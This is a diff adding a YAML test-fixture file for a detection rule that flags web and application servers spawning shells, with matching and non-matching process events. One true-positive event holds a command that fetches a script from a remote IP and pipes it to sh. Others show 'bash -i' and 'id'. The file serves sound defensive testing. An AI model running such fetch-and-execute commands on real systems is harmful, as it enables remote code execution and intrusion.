@@ -1,0 +1,38 @@
+true_positives:
+  - name: nginx spawning a reverse shell
+    event:
+      ParentImage: '/usr/sbin/nginx'
+      Image: '/bin/sh'
+      CommandLine: 'sh -c curl http://198.51.100.7/s | sh'
+  - name: java application server spawning bash
+    event:
+      ParentImage: '/usr/lib/jvm/java-17/bin/java'
+      Image: '/bin/bash'
+      CommandLine: 'bash -i'
+  - name: zimbra mailbox process spawning a shell
+    event:
+      ParentImage: '/opt/zimbra/bin/zmmailboxdctl'
+      Image: '/bin/sh'
+      CommandLine: 'sh -c id'
+
+true_negatives:
+  - name: a shell spawned by systemd, not by the web server
+    event:
+      ParentImage: '/usr/lib/systemd/systemd'
+      Image: '/bin/bash'
+      CommandLine: 'bash /opt/app/start.sh'
+  - name: nginx running its own healthcheck wrapper
+    event:
+      ParentImage: '/usr/sbin/nginx'
+      Image: '/bin/sh'
+      CommandLine: 'sh -c /usr/local/bin/healthcheck.sh'
+  - name: web server spawning a non-shell helper
+    event:
+      ParentImage: '/usr/sbin/apache2'
+      Image: '/usr/bin/convert'
+      CommandLine: 'convert upload.png thumb.png'
+  - name: an administrator shell from sshd
+    event:
+      ParentImage: '/usr/sbin/sshd'
+      Image: '/bin/bash'
+      CommandLine: '-bash'
